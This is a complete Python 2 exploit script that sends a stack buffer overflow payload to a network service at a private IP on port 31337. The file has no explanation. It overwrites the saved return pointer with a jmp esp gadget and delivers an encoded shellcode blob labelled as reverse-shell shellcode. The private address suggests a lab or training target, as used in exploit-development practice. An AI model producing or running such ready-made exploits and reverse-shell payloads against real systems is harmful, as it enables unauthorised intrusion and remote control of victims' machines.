#!/usr/bin/env python2
import socket
import struct

# set up IP and PORT we are connecting to.
RHOST = "192.168.86.55"
RPORT = 31337

# variables
buf_totlen = 1024
offset_srp = 146
ptr_jmp_esp = 0x080414c3
sub_esp_10 = "\x83\xec\x10"

# create a TCP connection (socket).
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# Shellcode
shellcode_rs =  b""
shellcode_rs += b"\xda\xd9\xbf\xe0\x09\x91\x1b\xd9\x74\x24"
shellcode_rs += b"\xf4\x5e\x29\xc9\xb1\x52\x31\x7e\x17\x03"
shellcode_rs += b"\x7e\x17\x83\x0e\xf5\x73\xee\x32\xee\xf6"
shellcode_rs += b"\x11\xca\xef\x96\x98\x2f\xde\x96\xff\x24"
shellcode_rs += b"\x71\x27\x8b\x68\x7e\xcc\xd9\x98\xf5\xa0"
shellcode_rs += b"\xf5\xaf\xbe\x0f\x20\x9e\x3f\x23\x10\x81"
shellcode_rs += b"\xc3\x3e\x45\x61\xfd\xf0\x98\x60\x3a\xec"
shellcode_rs += b"\x51\x30\x93\x7a\xc7\xa4\x90\x37\xd4\x4f"
shellcode_rs += b"\xea\xd6\x5c\xac\xbb\xd9\x4d\x63\xb7\x83"
shellcode_rs += b"\x4d\x82\x14\xb8\xc7\x9c\x79\x85\x9e\x17"
shellcode_rs += b"\x49\x71\x21\xf1\x83\x7a\x8e\x3c\x2c\x89"
shellcode_rs += b"\xce\x79\x8b\x72\xa5\x73\xef\x0f\xbe\x40"
shellcode_rs += b"\x8d\xcb\x4b\x52\x35\x9f\xec\xbe\xc7\x4c"
shellcode_rs += b"\x6a\x35\xcb\x39\xf8\x11\xc8\xbc\x2d\x2a"
shellcode_rs += b"\xf4\x35\xd0\xfc\x7c\x0d\xf7\xd8\x25\xd5"
shellcode_rs += b"\x96\x79\x80\xb8\xa7\x99\x6b\x64\x02\xd2"
shellcode_rs += b"\x86\x71\x3f\xb9\xce\xb6\x72\x41\x0f\xd1"
shellcode_rs += b"\x05\x32\x3d\x7e\xbe\xdc\x0d\xf7\x18\x1b"
shellcode_rs += b"\x71\x22\xdc\xb3\x8c\xcd\x1d\x9a\x4a\x99"
shellcode_rs += b"\x4d\xb4\x7b\xa2\x05\x44\x83\x77\x89\x14"
shellcode_rs += b"\x2b\x28\x6a\xc4\x8b\x98\x02\x0e\x04\xc6"
shellcode_rs += b"\x33\x31\xce\x6f\xd9\xc8\x99\x4f\xb6\x84"
shellcode_rs += b"\x60\x38\xc5\x28\x97\x6a\x40\xce\xfd\x9a"
shellcode_rs += b"\x05\x59\x6a\x02\x0c\x11\x0b\xcb\x9a\x5c"
shellcode_rs += b"\x0b\x47\x29\xa1\xc2\xa0\x44\xb1\xb3\x40"
shellcode_rs += b"\x13\xeb\x12\x5e\x89\x83\xf9\xcd\x56\x53"
shellcode_rs += b"\x77\xee\xc0\x04\xd0\xc0\x18\xc0\xcc\x7b"
shellcode_rs += b"\xb3\xf6\x0c\x1d\xfc\xb2\xca\xde\x03\x3b"
shellcode_rs += b"\x9e\x5b\x20\x2b\x66\x63\x6c\x1f\x36\x32"
shellcode_rs += b"\x3a\xc9\xf0\xec\x8c\xa3\xaa\x43\x47\x23"
shellcode_rs += b"\x2a\xa8\x58\x35\x33\xe5\x2e\xd9\x82\x50"
shellcode_rs += b"\x77\xe6\x2b\x35\x7f\x9f\x51\xa5\x80\x4a"
shellcode_rs += b"\xd2\xd5\xca\xd6\x73\x7e\x93\x83\xc1\xe3"
shellcode_rs += b"\x24\x7e\x05\x1a\xa7\x8a\xf6\xd9\xb7\xff"
shellcode_rs += b"\xf3\xa6\x7f\xec\x89\xb7\x15\x12\x3d\xb7"
shellcode_rs += b"\x3f"

# build a message followed by a newline.
buf = ""
buf += "A" * (offset_srp - len(buf))    # padding
buf += struct.pack("<I", ptr_jmp_esp)   # SRP overwrite
buf += sub_esp_10                       # ESP points here
buf += shellcode_rs
buf += "D" * (buf_totlen - len(buf))    # trailing padding
buf += "\n"

# send message down the socket.
s.send(buf)
